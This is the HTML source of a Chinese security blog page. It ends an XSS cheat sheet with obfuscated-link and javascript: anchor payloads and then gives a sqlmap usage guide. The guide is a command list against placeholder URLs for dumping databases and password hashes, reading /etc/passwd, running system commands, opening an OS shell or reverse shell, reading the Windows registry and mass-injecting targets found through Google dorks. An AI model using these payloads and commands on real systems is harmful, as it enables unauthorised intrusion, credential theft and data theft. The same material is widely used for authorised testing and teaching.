-
-(73)混合编码
-&lt;A HREF=&quot;h
-tt p://6 6.000146.0×7.147/&quot;&quot;&gt;XSS&lt;/A&gt;
-
-(74)节省[http:]
-&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
-
-(75)节省[www]
-&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;
-
-(76)绝对点绝对DNS
-&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;
-
-(77)javascript链接
-&lt;A HREF=&quot;javascript:document.location=’http://www.google.com/’&quot;&gt;XSS&lt;/A&gt;
-</code></pre>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/12/25/XSS/" data-id="cij1b1e5t0000wsfwxg2jzuvg" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-sqlmap" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2015/12/25/sqlmap/" class="article-date">
-  <time datetime="2015-12-25T06:45:05.000Z" itemprop="datePublished">2015-12-25</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/12/25/sqlmap/">sqlmap用法指南</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>SQL注入神器之sqlmap使用说明</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">sqlmap验证基础信息</span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span> --current-user <span class="comment">#获取当前用户名称 </span></span><br><span class="line"></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://www.xxoo.com/news?id=1"</span> --current-db <span class="comment">#获取当前数据库名称</span></span><br><span class="line"></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://www.xxoo.com/news?id=1"</span> --tables -D <span class="string">"db_name"</span> <span class="comment">#列表名 </span></span><br><span class="line"></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span> --columns -T <span class="string">"tablename"</span> users-D <span class="string">"db_name"</span> -v <span class="number">0</span> <span class="comment">#列字段</span></span><br><span class="line"></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span> --dump -C <span class="string">"column_name"</span> -T <span class="string">"table_name"</span> -D <span class="string">"db_name"</span> -v <span class="number">0</span> <span class="comment">#获取字段内容</span></span><br><span class="line"></span><br><span class="line">sqlmap验证信息内容</span><br><span class="line"></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>  --smart  --level <span class="number">3</span> --users  <span class="comment"># smart智能 level  执行测试等级</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>  --dbms <span class="string">"Mysql"</span> --users  <span class="comment"># dbms 指定数据库类型</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>    --users  <span class="comment">#列数据库用户</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>    --dbs<span class="comment">#列数据库 </span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --passwords <span class="comment">#数据库用户密码 </span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --passwords-U root  -v <span class="number">0</span> <span class="comment">#列出指定用户数据库密码</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>     --dump -C <span class="string">"password,user,id"</span> -T <span class="string">"tablename"</span> -D <span class="string">"db_name"</span> --start <span class="number">1</span> --stop <span class="number">20</span>  </span><br><span class="line"><span class="comment">#列出指定字段，列出20条 </span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>    --dump-all -v <span class="number">0</span> <span class="comment">#列出所有数据库所有表</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --privileges <span class="comment">#查看权限 </span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --privileges -U root <span class="comment">#查看指定用户权限</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>    --is-dba -v <span class="number">1</span> <span class="comment">#是否是数据库管理员</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>    --roles <span class="comment">#枚举数据库用户角色 </span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --udf-inject <span class="comment">#导入用户自定义函数（获取系统权限！）</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --dump-all --exclude-sysdbs -v <span class="number">0</span> <span class="comment">#列出当前库所有表</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --union-cols <span class="comment">#union 查询表记录 </span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --cookie <span class="string">"COOKIE_VALUE"</span> <span class="comment">#cookie注入</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   -b <span class="comment">#获取banner信息</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span> --data <span class="string">"id=3"</span>  <span class="comment">#post注入</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>  -v <span class="number">1</span> <span class="operator">-f</span> <span class="comment">#指纹判别数据库类型 </span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>  --proxy<span class="string">"http://127.0.0.1:8118"</span> <span class="comment">#代理注入</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>--string<span class="string">"STRING_ON_TRUE_PAGE"</span>  <span class="comment">#指定关键词</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --sql-shell <span class="comment">#执行指定sql命令</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --file /etc/passwd </span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --os-cmd=whoami <span class="comment">#执行系统命令</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --os-shell <span class="comment">#系统交互shell</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --os-pwn <span class="comment">#反弹shell </span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --reg-read <span class="comment">#读取win系统注册表</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>    --dbs-o <span class="string">"sqlmap.log"</span> <span class="comment">#保存进度 </span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>    --dbs  -o <span class="string">"sqlmap.log"</span> --resume  <span class="comment">#恢复已保存进度</span></span><br><span class="line">sqlmap -g <span class="string">"google语法"</span> --dump-all --batch  <span class="comment">#google搜索注入点自动 跑出所有字段攻击实例</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1&amp;Submit=Submit"</span> --cookie=<span class="string">"PHPSESSID=41aa833e6d0d28f489ff1ab5a7531406"</span> --string=<span class="string">"Surname"</span> --dbms=mysql --users --password</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/12/25/sqlmap/" data-id="cij1b1e6j0001wsfwq45vu55n" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-  
 </section>
         
           <aside id="sidebar">
